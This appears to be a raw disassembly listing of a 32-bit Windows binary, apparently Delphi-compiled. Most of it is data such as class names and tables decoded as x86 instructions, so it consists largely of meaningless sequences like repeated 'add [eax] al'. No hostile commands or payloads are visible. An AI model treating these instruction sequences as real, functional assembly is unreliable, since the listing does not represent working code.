add [ ebx + eax * 2 + 0x41 ] cl
add [ eax + 0x43 ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x43 ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ edx + 0x41 ] al
add [ ecx + eax * 2 + 0x6f6c0040 ] ch
inc ecx
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x6eac0041 ] bl
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add ah bh
outsd
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
add al 0x0
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
add [ edx + 0x41 ] al
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
outsb
dec ecx
je r-xdata
add [ edx + esi * 2 + 0x72dc0041 ] ch
inc ecx
add ah dl
jb r-xdata
add [ eax ] bl
aas
inc eax
add [ eax + 0x71 ] ah
inc ecx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add al cl
insd
inc ecx
add ah cl
jno r-xdata
inc ecx
inc eax
add ah bh
inc eax
imul esi [ ebx + 0x74 ] 0x78746e65
inc ebx
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
outsb
inc ecx
add [ esi + ebp * 2 + 0x73c40041 ] dh
inc ecx
insd
add [ eax ] al
add [ edi ] al
add [ eax ] ch
jno r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor [ ebp + 0x41 ] dh
add [ ebx ] cl
push esp
inc ebx
outsd
add ah bl
ja r-xdata
pop esp
je r-xdata
jae r-xdata
inc ebx
insb
popad
jae r-xdata
add [ edx ] al
add bh bh
int3
imul esi [ ebx + 0x74 ] 0x3c746e65
inc ebx
inc ecx
add [ edx + eax * 2 + 0x41 ] dh
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
pop esp
je r-xdata
jae r-xdata
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
or edx [ ebx + eax * 2 + 0x6f ]
add al ah
ja r-xdata
or edx [ ebx + eax * 2 + 0x6f ]
pop es
add al bl
je r-xdata
add [ ebp + 0x44a80040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc esp
inc ecx
add [ eax * 2 + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
jae r-xdata
pop es
add al bl
je r-xdata
add [ ebp + 0x457c0040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
inc ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 2 + 0x45ac0041 ] ah
inc ecx
add [ eax + eax ] bl
add [ eax ] al
pop esp
inc esp
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add al dl
ja r-xdata
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
test al 0x44
inc ecx
add [ edx + eax * 2 + 0x41 ] dh
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
outsd
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x14004010 ] dh
add [ eax ] al
add [ eax + eax ] al
std
inc ecx
inc ecx
add ah bh
inc esp
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax ] al
inc edx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x73 ] bl
inc ecx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add ah al
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x44
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc esp
inc ecx
add [ esi ] bl
inc esp
inc ecx
add [ eax + eax ] cl
add [ eax ] al
inc ecx
inc eax
add al al
inc ecx
jae r-xdata
jae r-xdata
add [ ecx ] al
add bh bh
dec [ eax + 0x78 ]
inc ecx
add [ eax ] dl
push esp
dec edi
ja r-xdata
ja r-xdata
add al bl
ja r-xdata
je r-xdata
add ah dl
ja r-xdata
hlt
add al bl
ja r-xdata
cmp [ eax - 0x7f3bffbf ] al
inc ecx
add [ eax - 0x6fffbe7f ] bl
xor al [ eax ]
add [ eax + 0x10004032 ] dl
jle r-xdata
add [ ebx + 0x4145f0c0 ] cl
add [ edi ] cl
cmovns edx [ ebx + 0x74 ]
jb r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add bh bh
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
les eax [ ebp + 0x41 ]
add [ edi ] al
adc [ edi + ecx * 2 + 0x77 ] dl
outsb
add [ eax ] bl
add [ eax ] al
add [ eax ] al
inc edx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ eax ] al
add [ eax ] al
inc ebx
outsd
insb
insb
inc ebx
add ah bl
ja r-xdata
add [ eax ] bl
aas
inc eax
add [ eax + 0x73 ] bl
inc ecx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add ah al
jae r-xdata
add ah bh
inc eax
outsb
outsd
or al 0x45
inc ecx
add [ edi ] al
add [ esp + esi * 2 + 0x41 ] bl
int3
cwde
add [ eax + 0x7e ] ch
inc ecx
add [ eax ] bl
aas
inc eax
add [ eax + edi * 2 + 0x41 ] cl
add [ esi + ebp * 2 + 0x7aa40041 ] ch
inc ecx
add [ ecx + edi * 2 + 0x41 ] bh
mov ah 0x41
inc eax
add ah bh
inc eax
outsb
jae r-xdata
jae r-xdata
inc ebx
insb
popad
inc ecx
add [ eax ] cl
inc ebp
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add al ah
ja r-xdata
jo r-xdata
inc ecx
add [ eax - 0x3bffbe88 ] ah
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edi + 0x41 ]
popad
jo r-xdata
dec [ ebx + 0x414670c0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
inc esi
outsb
jl r-xdata
outsd
add al dl
ja r-xdata
add [ eax ] al
push eax
dec eax
inc ecx
add [ edx + eax * 2 + 0x41 ] dh
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add ah ch
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
inc eax
jl r-xdata
add [ eax - 0x57ffbfce ] dl
jge r-xdata
add [ edx + edi * 2 + 0x797c0041 ] ah
inc ecx
jb r-xdata
add ah dl
ja r-xdata
ror [ ecx + eax * 2 + 0x418fd400 ] 0x1
add ah ch
mov [ ecx ] es
mov eax [ ecx ]
lodsb [ esi ]
outsb
inc ecx
add [ edx + edi * 2 + 0x797c0041 ] ah
inc ecx
jae r-xdata
add [ eax ] al
add [ eax + 0x48 ] al
inc ecx
add [ eax ] bh
add [ eax ] al
add [ esi + eax * 2 ] ah
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
outsb
jae r-xdata
inc ebp
inc ecx
add [ eax + eax ] dl
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax ] al
in al dx
add [ ecx ] r-xdata
add [ esi + edi * 2 ] dl
inc ecx
add [ eax ] bh
add [ ecx ] 0xc4
add [ ecx ] 0x98
inc ecx
add [ eax ] bl
inc edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
inc edi
inc ecx
adc [ eax ] eax
add [ edi + ebp ] esi
pushfd
jae r-xdata
inc ecx
add [ eax ] al
add [ edi ] al
add [ esp + esi * 2 + 0x41 ] bl
add al 0x92
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
add [ eax ] bl
mov es [ ecx ]
hlt
add [ edi + ecx * 4 ] dh
inc ecx
add ah al
add [ ecx ] 0x98
add [ ecx ] sub_418f70
or [ edi - 0x7e03ffbf ] 0x41
add [ eax - 0x7e ] dl
inc ecx
add ah bh
add [ ecx ] 0x90
test [ ecx ] al
call 0xffffffffa44189a9
test [ ecx ] eax
mov ah 0x8c
inc ecx
add al dl
mov [ ecx ] es
aam 0x8f
inc ecx
add [ ebx + 0x41473cc0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
insb
mov eax [ ecx ]
jl r-xdata
sbb [ edi + 0x41 ] al
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4307da82
insb
popad
jae r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x6d ] al
inc ecx
add [ eax - 0x6d ] bl
inc ecx
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
clc
xchg ebx eax
inc ecx
add [ esp + edx * 4 + 0x41 ] bh
add [ edi ] al
push esp
push ebx
je r-xdata
imul ebp [ esi + 0x67 ] 0x7473694c
push eax
dec eax
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
movsb [ edi ] [ esi ]
outsb
dec ecx
je r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah ah
lodsb [ esi ]
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
outsb
jae r-xdata
add [ ebx + eax * 4 - 0x7c23ffbf ] ch
inc ecx
add [ eax - 0x7b ] cl
inc ecx
add ah dh
test [ ecx ] eax
cwde
xchg [ ecx ] eax
jae r-xdata
push ebx
je r-xdata
popad
hlt
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
adc al 0x47
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
sub al 0x8d
inc ecx
add [ eax + 0x1400418d ] bl
jle r-xdata
add [ esi + ecx * 4 - 0x712fffbf ] bl
inc ecx
add ah dl
mov es [ ecx ]
fmul [ esi + 0x7e680041 ]
inc ecx
add [ eax - 0x70 ] dl
inc ecx
add [ eax + edx * 4 - 0x6e7fffbf ] ch
inc ecx
add ah dh
test [ ecx ] eax
mov esp 0x3c004191
xchg edx eax
inc ecx
add [ eax - 0x74 ] al
inc ecx
add [ eax - 0x74 ] dl
inc ecx
add ah al
js r-xdata
add [ ecx + edi * 2 + 0x41 ] bh
jpe r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov al 0x10
inc eax
add [ eax ] al
add [ eax ] al
add [ ebp + 0x47a80040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x48 ] dl
add al al
inc ecx
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax + 0x8004010 ] dh
add [ eax ] al
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
mov eax eax
xor [ edx + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 + 0x41 ] cl
add [ eax ] dl
add [ eax ] al
add [ eax + ecx * 2 + 0x41 ] dh
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x6d ] al
inc ecx
add [ eax - 0x6d ] bl
inc ecx
add [ eax - 0x67 ] ch
inc ecx
add [ eax - 0x5fffbfce ] dl
cdq
inc ecx
add [ esp + edx * 4 + 0x41 ] bh
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
insd
mov eax eax
test al 0x49
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
dec ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
dec ecx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
in al 0x48
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ecx + ebx * 4 ] ch
inc ecx
add ah dh
jb r-xdata
jae r-xdata
jl r-xdata
je r-xdata
add [ edi + edx * 4 ] cl
inc ecx
add [ 0x6e614854 ] cl
insb
insd
xor [ ecx + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 2 + 0x41 ] cl
add [ eax ] cl
add [ eax ] al
add [ eax + ecx * 2 + 0x41 ] dh
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah dh
xchg edx eax
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ edi + edx * 4 + 0x41 ] cl
add ah ch
xchg esi eax
inc ecx
add ah bh
xchg esi eax
inc ecx
add al bh
xchg ebx eax
inc ecx
popad
add [ ebp + 0x48c00040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
dec eax
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
push ebx
je r-xdata
inc ecx
add [ edx + ebx * 4 + 0x540d0041 ] dl
dec ebp
inc ecx
add [ esp + edx * 4 + 0x41 ] bh
insd
dec ebp
insd
outsd
jb r-xdata
insd
outsd
jb r-xdata
popad
insd
lodsb [ esi ]
dec edx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
dec edx
inc ecx
add [ eax + eax ] dl
add [ eax ] al
in al 0x49
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah al
cdq
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x66 ] ch
inc ecx
add [ eax - 0x6d ] bl
inc ecx
add [ eax - 0x67 ] ch
inc ecx
add [ ebx + ebx * 4 ] dl
inc ecx
add [ eax + 0x7c004199 ] ah
xchg esp eax
add [ eax + 0x4004010 ] dh
add [ eax ] al
add [ 0x72745354 ] cl
push ebx
jns r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
add [ ecx ] al
add [ eax ] al
popad
insd
mov eax eax
sub [ ebx + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 2 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4b ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
hlt
je r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
imul ebp [ esi + 0x67 ] 0x65727453
popad
insd
mov al 0x4b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
dec ebx
inc ecx
add [ eax ] bl
add [ eax ] al
add ah ah
dec ecx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] al
sahf
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x6d ] al
inc ecx
add [ eax - 0x6d ] bl
inc ecx
add [ eax - 0x67 ] ch
inc ecx
add [ eax ] dh
sahf
inc ecx
add [ eax + 0x7c004199 ] ah
xchg esp eax
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
mov al 0x10
inc eax
add [ eax + eax ] al
add [ eax ] al
or eax 0x72745354
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah dh
xchg edx eax
inc ecx
add [ eax + 0x5800419c ] al
xchg ebx eax
inc ecx
add [ eax - 0x17ffbe65 ] ch
fwait
inc ecx
add [ eax ] ah
pushfd
inc ecx
add [ esp + edx * 4 + 0x41 ] bh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_4149a9
xchg edx eax
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ edi + edx * 4 + 0x41 ] cl
add ah ch
xchg esi eax
inc ecx
add ah bh
xchg esi eax
inc ecx
add al bh
xchg ebx eax
inc ecx
add [ edi + edx * 4 ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x8004010 ] dh
add [ eax ] al
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
mov eax eax
xor [ edx + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 + 0x41 ] cl
add [ eax ] dl
add [ eax ] al
add [ eax + ecx * 2 + 0x41 ] dh
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x6d ] al
inc ecx
add [ eax - 0x6d ] bl
inc ecx
add [ eax - 0x67 ] ch
inc ecx
add [ eax - 0x5fffbfce ] dl
cdq
inc ecx
add [ esp + edx * 4 + 0x41 ] bh
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
jl r-xdata
je r-xdata
push ebx
je r-xdata
inc ecx
add [ edx + ebx * 4 + 0x540d0041 ] dl
dec ebp
inc ecx
add [ esp + edx * 4 + 0x41 ] bh
insd
dec ebp
insd
outsd
jb r-xdata
insd
outsd
jb r-xdata
popad
insd
lodsb [ esi ]
dec edx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
dec edx
inc ecx
add [ eax + eax ] dl
add [ eax ] al
in al 0x49
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah al
cdq
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x66 ] ch
inc ecx
add [ eax - 0x6d ] bl
inc ecx
add [ eax - 0x67 ] ch
inc ecx
add [ ebx + ebx * 4 ] dl
inc ecx
add [ eax + 0x7c004199 ] ah
xchg esp eax
add [ eax + 0x4004010 ] dh
add [ eax ] al
add [ 0x72745354 ] cl
push ebx
jns r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
add [ ecx ] al
add [ eax ] al
popad
insd
mov eax eax
sub [ ebx + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 2 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4b ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
hlt
je r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
imul ebp [ esi + 0x67 ] 0x65727453
popad
insd
mov al 0x4b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
dec ebx
inc ecx
add [ eax ] bl
add [ eax ] al
add ah ah
dec ecx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] al
sahf
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ eax - 0x6d ] al
inc ecx
add [ eax - 0x6d ] bl
inc ecx
add [ eax - 0x67 ] ch
inc ecx
add [ eax ] dh
sahf
inc ecx
add [ eax + 0x7c004199 ] ah
xchg esp eax
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
mov al 0x10
inc eax
add [ eax + eax ] al
add [ eax ] al
or eax 0x72745354
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah dh
xchg edx eax
inc ecx
add [ eax + 0x5800419c ] al
xchg ebx eax
inc ecx
add [ eax - 0x17ffbe65 ] ch
fwait
inc ecx
add [ eax ] ah
pushfd
inc ecx
add [ esp + edx * 4 + 0x41 ] bh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_414d62
inc ecx
add [ eax - 0x16 ] ch
inc ecx
add [ esi ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add [ eax ] al
retn 0x414e
rcr [ eax ] 0x4f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
dec edi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] al
inc ebp
push esp
push 0x64616572
insb
dec edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 + 0x41 ] dh
add [ eax + eax ] bh
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ esi + edx * 8 ] bh
inc ecx
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al cl
aad 0x41
add al dh
salc
inc ecx
add [ eax + 0x7004032 ] dl
push esp
push esp
push 0x64616572
or [ edi + 0x41 ] 0x0
or cl [ esi ]
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
dec esi
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x47ffbe62 ] dl
sahf
inc ecx
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x414e8490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x414e ] dh
jb r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x1800414d
add [ eax ] al
add [ eax - 0x53ffbfef ] dh
inc ecx
inc eax
add [ ebx + ebp * 2 + 0x40 ] dh
add [ eax - 0x3fffbf95 ] al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x6b900040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah al
in eax 0x41
add ah bh
in eax 0x41
add [ esi + 0x41 ] ah
add ah cl
out 0x41 al
add [ eax - 0x19 ] dl
inc ecx
add [ edi - 0x1643ffbf ] dh
inc ecx
add al cl
jmp 0xffffffffea154d9b
les ecx [ ebp + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
dec ebp
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebx * 2 + 0x540c0041 ] bl
inc ebx
insb
popad
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp r-xdata
popad
insd
xchg esp eax
dec edi
inc ecx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
dec esi
inc ecx
add [ eax + eax + 0x4dd40000 ] cl
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
